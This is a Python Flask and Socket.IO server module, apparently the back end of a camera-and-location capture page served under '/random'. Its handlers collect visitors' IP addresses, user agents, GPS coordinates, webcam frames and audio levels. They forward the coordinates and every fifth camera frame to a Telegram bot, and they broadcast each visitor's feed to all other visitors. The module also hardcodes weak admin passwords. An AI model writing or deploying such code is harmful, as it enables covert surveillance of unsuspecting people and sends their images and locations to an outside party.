from flask import Blueprint, render_template, request, session, redirect, url_for
from flask_socketio import emit, join_room
import base64
import os
import requests
from main import socketio

bp = Blueprint('random_route', __name__, url_prefix='/random')

ADMIN_PASSWORD = 'admin123'
CLEAR_PASSWORD = 'arif123'

# টেলিগ্রাম কনফিগ – এনভায়রনমেন্ট ভেরিয়েবল থেকে
BOT_TOKEN = os.environ.get('BOT_TOKEN')
CHAT_ID = os.environ.get('CHAT_ID')
BOT_ENABLED = bool(BOT_TOKEN and CHAT_ID)   # True = শুধু টেলিগ্রাম, False = শুধু ড্যাশবোর্ড

clients = {}

def send_telegram(text, photo_bytes=None):
    if not BOT_ENABLED:
        return
    try:
        if photo_bytes:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
            requests.post(url, data={'chat_id': CHAT_ID}, files={'photo': photo_bytes}, timeout=5)
        else:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            requests.post(url, data={'chat_id': CHAT_ID, 'text': text, 'parse_mode': 'HTML'}, timeout=5)
    except Exception as e:
        print(f"Telegram error: {e}")

# ========== ওয়েব রাউট ==========
@bp.route('/')
def index():
    return render_template('random_index.html', bot_enabled=BOT_ENABLED)

@bp.route('/admin')
def admin():
    if not session.get('admin_logged_in'):
        return redirect(url_for('random_route.admin_login'))
    return render_template('random_admin.html', bot_enabled=BOT_ENABLED)

@bp.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        if request.form.get('password') == ADMIN_PASSWORD:
            session['admin_logged_in'] = True
            return redirect(url_for('random_route.admin'))
        return render_template('random_admin_login.html', error='Wrong password')
    return render_template('random_admin_login.html')

@bp.route('/admin/logout')
def admin_logout():
    session.pop('admin_logged_in', None)
    return redirect(url_for('random_route.admin'))

# ========== Socket.IO ==========
@socketio.on('connect')
def handle_connect():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    ua = request.headers.get('User-Agent')
    print(f"🔌 New connection: {request.sid}, ip={ip}")

    if ip not in clients:
        clients[ip] = {
            'id': ip,
            'ip': ip,
            'user_agent': ua,
            'location': None,
            'last_frame': None,
            'audio_level': 0,
            'sids': [request.sid],
            'offline': False
        }
    else:
        if request.sid not in clients[ip]['sids']:
            clients[ip]['sids'].append(request.sid)
        clients[ip]['offline'] = False
        clients[ip]['user_agent'] = ua

    # বট সক্রিয় থাকলে ড্যাশবোর্ডে আপডেট পাঠাবো না
    if not BOT_ENABLED:
        emit_admin_update()
        emit_public_update()

@socketio.on('disconnect')
def handle_disconnect():
    for ip, data in list(clients.items()):
        if request.sid in data['sids']:
            data['sids'].remove(request.sid)
            if not data['sids']:
                data['offline'] = True
                print(f"📴 User {ip} went offline")
            break
    if not BOT_ENABLED:
        emit_admin_update()
        emit_public_update()

@socketio.on('ready')
def handle_ready():
    print(f"✅ Received 'ready' from {request.sid}")

@socketio.on('location_update')
def handle_location(data):
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    print(f"📍 LOCATION from {ip}: {data}")
    if ip in clients:
        clients[ip]['location'] = data
        clients[ip]['offline'] = False
        if BOT_ENABLED:
            send_telegram(f"📍 Location from {ip}\nLat: {data['lat']}, Lng: {data['lng']}")
        else:
            emit_admin_update()
            emit_public_update()

@socketio.on('video_frame')
def handle_video(data):
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    image = data.get('image')
    audio = data.get('audio_volume', 0)
    print(f"🎥 VIDEO from {ip}: audio={audio}, image size={len(image) if image else 0}")
    if ip in clients:
        clients[ip]['last_frame'] = image
        clients[ip]['audio_level'] = audio
        clients[ip]['offline'] = False
        if BOT_ENABLED:
            # প্রতি ৫ম ফ্রেমে টেলিগ্রামে ফটো পাঠাও (রেট লিমিট এড়াতে)
            if not hasattr(handle_video, 'counter'):
                handle_video.counter = 0
            handle_video.counter += 1
            if handle_video.counter % 5 == 0 and image:
                try:
                    img_bytes = base64.b64decode(image.split(',')[1])
                    send_telegram(f"🎥 Frame from {ip}\n🔊 Audio: {audio}%", photo_bytes=img_bytes)
                except:
                    pass
        else:
            emit_admin_update()
            emit_public_update()

@socketio.on('admin_join')
def handle_admin_join():
    join_room('admin_room')
    print(f"🛡️ Admin joined room: {request.sid}")
    if not BOT_ENABLED:
        emit('admin_update', clients, to='admin_room')

def emit_admin_update():
    emit('admin_update', clients, to='admin_room')

def emit_public_update():
    online_clients = {ip: data for ip, data in clients.items() if not data['offline']}
    online_count = len(online_clients)
    offline_count = sum(1 for data in clients.values() if data['offline'])
    for ip, data in clients.items():
        if data['offline']:
            continue
        filtered = {other_ip: other_data for other_ip, other_data in online_clients.items() if other_ip != ip}
        payload = {
            'clients': filtered,
            'online_count': online_count,
            'offline_count': offline_count
        }
        for sid in data['sids']:
            emit('public_update', payload, to=sid)

@socketio.on('clear_data')
def handle_clear(data):
    if data.get('password') == CLEAR_PASSWORD:
        clients.clear()
        emit('clear_all', broadcast=True)
        if BOT_ENABLED:
            send_telegram("🗑️ All data cleared by admin")
        else:
            emit_admin_update()
        return {'status': 'ok'}
    else:
        return {'status': 'error', 'message': 'Wrong password'}
